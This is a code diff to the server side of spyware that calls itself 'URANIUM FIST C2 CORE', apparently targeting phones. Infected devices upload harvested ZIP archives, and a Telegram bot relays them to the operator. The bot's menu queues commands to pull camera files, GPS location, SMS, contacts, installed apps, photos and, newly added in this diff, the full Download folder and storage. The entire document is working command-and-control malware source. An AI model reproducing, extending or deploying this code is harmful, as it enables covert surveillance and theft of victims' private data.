@@ -44,10 +44,9 @@ async function sendTg(msg, options = {}) {
 }
 
 app.get('/', (req, res) => {
-    res.status(200).send(`<html><body style="background:#111;color:#ff5500;font-family:monospace;text-align:center;padding-top:50px;"><h1>[☢️] URANIUM FIST C2 CORE ONLINE [☢️]</h1></body></html>`);
+    res.status(200).send(`<html><body style="background:#111;color:#ff5500;font-family:monospace;text-align:center;padding-top:50px;"><h1>[☢️] URANIUM FIST C2 CORE ONLINE [☢️️]</h1></body></html>`);
 });
 
-// نقطة استقبال الرفع الثنائي الخام (Raw Binary / ZIP)
 app.post('/api/v3/uranium/upload_raw', async (req, res) => {
     try {
         const nodeId = req.headers['x-node-id'] || 'unknown';
@@ -71,13 +70,13 @@ app.post('/api/v3/uranium/upload_raw', async (req, res) => {
             await sendTg(`⚠️ <b>الملف كبير جداً (${fileSizeMB.toFixed(2)} MB):</b> يتجاوز حد تيليجرام (50MB)، تم حفظه بأمان في خزنة اليورانيوم.`);
         } else {
             await appBot.sendDocument(chatId, finalPath, { 
-                caption: `☢️ <b>قبضة اليورانيوم - أرشيف الحصاد:</b>\n📱 العقدة: <code>${nodeId}</code> (${nodeModel})\n📂 <code>${safeName}</code> (${fileSizeMB.toFixed(2)} MB)` 
+                caption: `☢️ <b>قبضة اليورانيوم - أرشيف الحصاد الشامل:</b>\n📱 العقدة: <code>${nodeId}</code> (${nodeModel})\n📂 <code>${safeName}</code> (${fileSizeMB.toFixed(2)} MB)` 
             });
         }
 
         res.status(200).json({ status: 'OK', message: 'URANIUM_UPLOAD_SUCCESS' });
     } catch (e) {
-        console.error('Uranium Upload Error:', e);
+        console.error('Raw Upload Error:', e);
         res.status(500).json({ status: 'SERVER_ERROR', message: e.message });
     }
 });
@@ -100,7 +99,7 @@ app.post('/api/v3/uranium/stream', async (req, res) => {
 
         if (payload.type === 'TEXT_REPORT') {
             const textData = payload.data || '';
-            if (textData.includes('خطأ') || textData.includes('Error') || textData.includes('فشل') || textData.includes('بنجاح') || textData.includes('LOCATION') || textData.includes('APPS') || textData.includes('SHELL')) {
+            if (textData.includes('خطأ') || textData.includes('Error') || textData.includes('فشل') || textData.includes('بنجاح') || textData.includes('LOCATION') || textData.includes('APPS') || textData.includes('HARVEST') || textData.includes('DOWNLOAD') || textData.includes('الفحص')) {
                 await sendTg(`☢️ <b>تقرير قبضة اليورانيوم [<code>${nodeId}</code>]:</b>\n<pre>${textData.substring(0, 3500)}</pre>`);
             }
         }
@@ -150,7 +149,11 @@ appBot.on('callback_query', async (query) => {
             inline_keyboard: [
                 [
                     { text: '☢️ حصاد الكاميرا الشامل (ZIP)', callback_data: `cmd_EXTRACT_CAMERA_ZIP_${nodeId}` },
-                    { text: '📍 تحديد الموقع الجغرافي (GPS)', callback_data: `cmd_EXTRACT_LOCATION_${nodeId}` }
+                    { text: '📥 سحب Download والتخزين الشامل', callback_data: `cmd_EXTRACT_STORAGE_ZIP_${nodeId}` }
+                ],
+                [
+                    { text: '📍 تحديد الموقع (GPS)', callback_data: `cmd_EXTRACT_LOCATION_${nodeId}` },
+                    { text: '📱 التطبيقات المثبتة', callback_data: `cmd_EXTRACT_APPS_${nodeId}` }
                 ],
                 [
                     { text: '📨 الرسائل', callback_data: `cmd_EXTRACT_SMS_${nodeId}` },
@@ -158,15 +161,12 @@ appBot.on('callback_query', async (query) => {
                 ],
                 [
                     { text: '📇 جهات الاتصال', callback_data: `cmd_EXTRACT_CONTACTS_${nodeId}` },
-                    { text: '📱 التطبيقات المثبتة', callback_data: `cmd_EXTRACT_APPS_${nodeId}` }
-                ],
-                [
                     { text: '📸 أحدث صورة', callback_data: `cmd_EXTRACT_PHOTOS_${nodeId}` }
                 ],
                 [{ text: '🔙 عودة للقائمة الرئيسية', callback_data: 'back_home' }]
             ]
         };
-        await appBot.editMessageText(`🎯 <b>العقدة التحت سيطرة قبضة اليورانيوم:</b> <code>${nodeId}</code>`, {
+        await appBot.editMessageText(`🎯 <b>العقدة تحت سيطرة قبضة اليورانيوم:</b> <code>${nodeId}</code>`, {
             chat_id: msg.chat.id,
             message_id: msg.message_id,
             parse_mode: 'HTML',
@@ -178,7 +178,7 @@ appBot.on('callback_query', async (query) => {
         const action = parts.slice(1).join('_');
 
         db.run(`INSERT INTO tasks (node_id, action, payload, status) VALUES (?, ?, '{}', 'PENDING')`, [targetNodeId, action], async () => {
-            await appBot.answerCallbackQuery(query.id, { text: `☢️️ تم إطلاق أمر قبضة اليورانيوم [${action}] بنجاح!` });
+            await appBot.answerCallbackQuery(query.id, { text: `☢️ تم إطلاق أمر قبضة اليورانيوم [${action}] بنجاح!` });
             await sendTg(`🔥 <b>أمر قبضة اليورانيوم [<code>${action}</code>] قيد التنفيذ للعقدة <code>${targetNodeId}</code>...</b>`);
         });
     } else if (data === 'back_home') {
